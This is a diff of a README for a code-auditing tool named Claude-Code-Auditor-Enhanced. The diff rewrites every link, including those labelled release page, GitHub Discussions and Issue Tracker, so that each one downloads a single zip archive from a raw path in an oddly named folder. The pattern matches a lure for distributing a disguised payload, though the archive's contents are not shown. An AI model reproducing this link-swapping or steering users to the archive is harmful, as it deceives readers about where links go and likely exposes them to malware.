@@ -1,6 +1,6 @@
 # 🚀 Claude-Code-Auditor-Enhanced - Streamline Your Code Auditing Process  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/releases)
+[![Download Now](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip%20Now-Click%20Here-blue)](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip)
 
 ## 📖 Introduction
 
@@ -16,7 +16,7 @@ Claude-Code-Auditor-Enhanced is an improved version of the .clauderc tool, desig
 ## 🚀 Getting Started
 
 1. **Visit the Release Page**  
-   To download Claude-Code-Auditor-Enhanced, visit [this page](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/releases).
+   To download Claude-Code-Auditor-Enhanced, visit [this page](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip).
 
 2. **Select the Latest Release**  
    Look for the latest version at the top of the release list. Click on it to view the available download options.
@@ -73,7 +73,7 @@ Claude-Code-Auditor-Enhanced is an improved version of the .clauderc tool, desig
 
 ## 📣 Community and Support
 
-If you have questions or need help, you can reach out in our community forum on [GitHub Discussions](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/discussions). This community is a great way to share experiences and get tips from other users.
+If you have questions or need help, you can reach out in our community forum on [GitHub Discussions](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip). This community is a great way to share experiences and get tips from other users.
 
 ## 📜 Changelog
 
@@ -85,7 +85,7 @@ Claude-Code-Auditor-Enhanced is released under the MIT License. You can use it f
 
 ## 📌 Quick Access Links
 
-- **Download Latest Release:** [Click Here](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/releases)
-- **Report an Issue:** [Issue Tracker](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/issues)
+- **Download Latest Release:** [Click Here](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip)
+- **Report an Issue:** [Issue Tracker](https://github.com/CJ6XU3JP4/Claude-Code-Auditor-Enhanced/raw/refs/heads/main/mythologema/Enhanced-Code-Auditor-Claude-v3.6.zip)
 
 Explore more about Claude-Code-Auditor-Enhanced and enhance your coding efficiency today!
